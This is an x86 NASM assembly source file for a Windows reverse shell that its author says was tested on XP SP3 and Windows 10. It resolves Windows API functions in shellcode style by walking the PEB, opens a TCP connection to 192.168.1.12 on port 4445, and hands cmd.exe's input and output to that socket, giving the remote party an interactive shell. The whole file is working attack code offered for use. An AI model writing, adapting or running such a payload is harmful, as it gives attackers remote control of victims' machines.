; ========================
; @Maroder
; @for DevGnode 
; nasm -f win32 reverse_shell.s -o reverse_shell.o
; ld -m i386 reverse_shell.o -o reverse_shell32.exe
;
; targets :
;	WIN32 -  i've try this reverse shell on 
;		 XP SP3, Win10 pro Arch.
;
;=========================
[BITS 32]


%define HANDLE DWORD
%define SOCKET DWORD

WSADESCRIPTION_LEN equ 	256
WSASYS_STATUS_LEN equ 	128

; ========================
; Structure
;=========================
struc STARTUPINFO
	.cb			resd	1
	.lpReserved		resd	1
	.lpDesktop		resd	1
	.lpTitle		resd	1
	.dwX			resd	1
	.dwY			resd	1
	.dwXSize		resd	1
	.dwYSize		resd	1
	.dwXCountChars		resd	1
	.dwYCountChars		resd	1
	.dwFillAttribute	resd	1
	.dwFlags		resd	1
	.wShowWindow		resw	1
	.cbReserved2		resw	1
	.lpReserved2		resd	1
	.hStdInput		resd	1
	.hStdOutput		resd	1
	.hStdError		resd	1
endstruc

struc PROCESS_INFORMATION
	.hProcess		resd	1
	.hThread		resd	1
	.dwProcessId		resd	1
	.dwThreadId		resd	1
endstruc

struc WSAData
	.wVersion		resw	1
	.wHighVersion		resw	1
	.iMaxSockets		resw	1
	.iMaxUdpDg		resw	1
	.lpVendorInfo		resd	1
	.szDescription		resb 	WSADESCRIPTION_LEN + 1
	.szSystemStatus		resb	WSASYS_STATUS_LEN + 1
endstruc

struc SOCKADDR_IN
	.sin_family	resw	1
	.sin_port	resw	1
	.sin_addr	resd	1
	.sin_zero	resb	8
endstruc


	global _start
; ========================
; DATA
;=========================
section .data
; ========================
; Pointer
;=========================
section .bss
	ssi resb 0x44
	spi resb 0x10
	swd resb 0x10A
	sss resb 0x10
; ========================
; text
;=========================
section .text

_start:

; Strack
; str
; str
; str
; 0000str
; kernel32 base
; ws2_32 base
; =----------------- return
;
;
	mov ebp, esp		; stack
	sub esp, 0x40		; string pointer
	
	;-----------------
	; TEB
	;-----------------
	xor edx, edx
	mov dl, 0x30
	mov edx, [fs:edx]		; TEB
	mov eax, dword[edx+0x0c]	; LDR
	mov esi, dword[eax+0x1c]	; InMemOrderModuleList
	mov esi, dword[esi]		
	mov edi, dword[esi+0x08]	; KernelBase
	mov [esp+0x3c],edi		; kernel MZ | ESP + (15*4)

	;-----------------
	; PE32
	;-----------------
	mov ebx, [edi+0x3C]		; PE Offset 
	add ebx, edi			; loadOffset
	mov ebx, [ebx+0x78]		; RVA exportTable offset
	add ebx, edi			; loadOffset
	mov esi, [ebx+0x20]
	add esi, edi
	
	;-----------------
	; find GetProcessAddress
	;-----------------
	xor ecx, ecx
	doal:
	inc ecx
	lodsd
	add eax, edi
	cmp dword[eax],0x50746547 	; Get
	jne doal
	cmp dword[eax+0x04],0x41636f72 	; Proc
	jne doal
	cmp dword[eax+0x08],0x65726464 	; Addr
	jne doal
	cmp word[eax+0x0c],0x7373	; ess
	jne doal
	
	dec ecx
	mov esi,[ebx+0x1c]
	add esi,edi

	mov ecx,[esi+ecx*4]
	add ecx,edi	
	mov [esp+0x38], ecx
	xchg ecx, edi
	
	;-----------------
	; find LoadLibrary
	;-----------------
	xor eax, eax
	mov dword[esp+0x00],0x64616f4c	; Load
	mov dword[esp+0x04],0x7262694c	; Libr
	mov dword[esp+0x08],0x41797261  ; aryA
	mov dword[esp+0x0c], eax
	lea eax, [esp]
	push eax
	push ecx
	call edi
	
	; ===========================
	; ws2_32.dll
	;============================
	xor ecx, ecx
	mov dword[esp+0x08], ecx
	mov dword[esp+0x00],0x5f327377 	; _2sw
	mov dword[esp+0x04],0x642e3233	; d.23
	mov word[esp+0x08],0x6c6c	; ll
	lea ebx,[esp]
	push ebx
	call eax
	
	mov dword[esp+0x34], eax	; ESP + 13*4	
	
	; ===========================
	; WSAStatrup
	;============================
	xor ebx, ebx
	mov dword[esp+0x08], ebx
	mov dword[esp+0x00],0x53415357 	; pu
	mov dword[esp+0x04],0x74726174	; trat
	mov word[esp+0x08], 0x7075	; SASW
	lea ebx,[esp]
	push ebx
	push eax
	call edi

	mov dword[esp+0x30], eax	; ESP + 12*4
	
	; ===========================
	; WSASocket
	;============================
	xor ebx, ebx
	mov dword[esp+0x08], ebx
	mov dword[esp+0x00],0x53415357 	; pu
	mov dword[esp+0x04],0x656b636f	; ekto
	mov word[esp+0x08], 0x4174	; SASW
	lea ebx,[esp]
	mov eax, dword[esp+0x34]
	push ebx
	push eax
	call edi

	mov dword[esp+0x2C], eax	; ESP + 11*4

	; ===========================
	; WSAConnect
	;============================
	xor ebx, ebx
	mov dword[esp+0x08], ebx
	mov dword[esp+0x00],0x43415357 	; tc
	mov dword[esp+0x04],0x656e6e6f	; enno
	mov word[esp+0x08], 0x7463	; CASW
	lea ebx,[esp]
	mov eax, dword[esp+0x34]
	push ebx
	push eax
	call edi

	mov dword[esp+0x28], eax	; ESP + 11*4

	; ===========================
	; CreateProcess
	;============================
	xor ebx, ebx
	mov dword[esp+0x0c], ebx
	mov dword[esp+0x00],0x61657243 	; aerC
	mov dword[esp+0x04],0x72506574	; rPet
	mov dword[esp+0x08], 0x7365636f	; seco
	mov word[esp+0x0c],0x4173	; As
	lea ebx,[esp]
	mov eax,[esp+0x3c]
	push ebx
	push eax
	call edi
	
	mov dword[esp+0x24], eax	; ESP + 10*4

	; ===========================
	; ExitProcess
	;============================
	xor ebx, ebx
	mov dword[esp+0x0c], ebx
	mov dword[esp+0x00],0x74697845 	; tixE
	mov dword[esp+0x04],0x636f7250	; corP
	mov dword[esp+0x08],0x737365	; sse
	lea ebx,[esp]
	mov eax,[esp+0x3c]
	push ebx
	push eax
	call edi
	
	mov dword[esp+0x20], eax	; ESP + 09*4


	_WSAStartup:
	xor eax, eax
	mov edi, dword[esp+0x30]
	push swd
	mov ax,0x0202
	push eax 
	call edi

	WSASocket:
	xor eax, eax
	mov edi, dword[esp+0x2C]
	push eax
	push eax
	push eax
	mov al,0x06	; IPPROTO_TCP
	push eax	;
	sub al,0x05	; SOCK_STREAM
	push eax	;
	add al,0x01	; AF_INET
	push eax
	call edi	
	
	cmp eax,0xFFFFFFFF
	je ret

	; socket Handle
	mov DWORD[esp+0x1C],eax	; SOCKET 
	
	; SOCKADDR_IN
	xor ecx, ecx
	inc ecx
	inc ecx
	mov WORD[ sss + SOCKADDR_IN.sin_family ],cx		; AF_INET
	mov WORD[ sss + SOCKADDR_IN.sin_port ],  0x5D11		; port 4445
	mov DWORD[ sss + SOCKADDR_IN.sin_addr ], 0x0c01a8c0 	; IP   192.168.1.12

	_WSAConnect:
	xor eax,eax
	mov edi, dword[esp+0x28]
	mov edx,[esp+0x1C]	; SOCKET
	xor eax,eax		; raz eax
	push eax		; 
	push eax		;
	push eax		;
	push eax		;
	mov al,0x10		; sizeof SOCKADDR
	push eax		;
	mov eax,sss 		; SOCKADDR
	push eax		;
	;mov eax, edx		; socket Handle
	push edx
	;mov edi, 0x71A00C81
	call edi
	
	cmp eax,0xFFFFFFFF
	je ret

	xor eax,eax
	mov edx, [esp+0x1C]
	mov ah,0x01
	inc eax
	mov DWORD[ ssi + STARTUPINFO.dwFlags ], eax
	mov DWORD[ ssi + STARTUPINFO.hStdInput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdOutput ], edx
	mov DWORD[ ssi + STARTUPINFO.hStdError ], edx

	_CreateProcess:
	xor 	eax, eax
	mov 	edi, dword[esp+0x24]
	push 	spi		; PROCESS_INFORMATION
	push 	ssi		; STARTUPINFO
	push 	eax		;
	push	eax		;
	push 	eax		;
	inc 	eax		;
	push 	eax		; true
	dec 	eax		;
	push 	eax		;
	push	eax		;
	push	_cmd		; Str CMD
	push	eax		;
	call	edi		; call
	
	_ExitProcess:
	mov 	edi, dword[esp+0x20]
	xor 	eax, eax
	push	eax
	call 	edi
	
	ret:
	leave

	_cmd: 	db "cmd.exe",0
